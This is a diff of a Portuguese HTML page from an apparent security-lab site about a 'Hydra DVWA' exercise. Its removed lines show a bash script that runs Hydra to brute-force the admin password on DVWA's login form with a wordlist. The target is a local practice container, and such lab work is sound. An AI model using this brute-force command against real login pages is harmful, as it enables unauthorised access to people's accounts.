@@ -1,43 +1,21 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8"/>
-  <title>play-02-hydra-dvwa — Detalhes</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <link rel="stylesheet" href="../style.css"/>
+  <title>Play 02 — Hydra DVWA</title>
 </head>
 <body class="neon-dark">
-  <article>
-    <h1>Play 02 Hydra Dvwa</h1>
-    <p>Este Play executa o comando <code>cd "$(dirname "$0")"</code>, permitindo avaliar aspectos específicos de segurança.</p>
-    <h2>Script <code>run.sh</code></h2>
-    <pre><code>#!/usr/bin/env bash
-#
-# denis-play-backend/plays/play-02-hydra-dvwa/run.sh
-
-# muda para o diretório do script
-cd "$(dirname "$0")"
-
-# host e porta padrão (serviço docker-compose)
-HOST=${1:-dvwa}
-PORT=${2:-80}
-
-echo "[*] Iniciando ataque com Hydra contra $HOST:$PORT..."
-sleep 1
-
-# hydra espera primeiro o HOST (sem :porta) e -s porta separadamente
-hydra -l admin \
-      -P passwords.txt \
-      -s "$PORT" \
-      "$HOST" http-form-post \
-      "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
-      -t 4 -V > resultado.txt
-
-echo
-echo "[📄] Saída do Hydra:"
-cat resultado.txt
-echo
-echo "[✔️] Teste concluído com sucesso."
-</code></pre>
-  </article>
+  <div class="post-modal-centered">
+    <h1>Play 02 — Hydra DVWA</h1>
+    <p>Este post apresenta detalhes técnicos do teste automatizado Play 02 — Hydra DVWA.</p>
+    <div class="post-modal-footer-btns">
+      <a class="btn neon-btn" href="../plays/play-01-nmap-recon/index.html">▶ Ir ao Play</a>
+      <a class="btn neon-btn" href="../index.html">🏠 Voltar à Home</a>
+    </div>
+    <p class="curiosity">🧠 Quer se aprofundar em <strong>HYDRA DVWA</strong>?
+    <a href="https://www.google.com/search?q=Hydra DVWA+documentation" target="_blank">Explore a documentação oficial →</a></p>
+  </div>
 </body>
 </html>
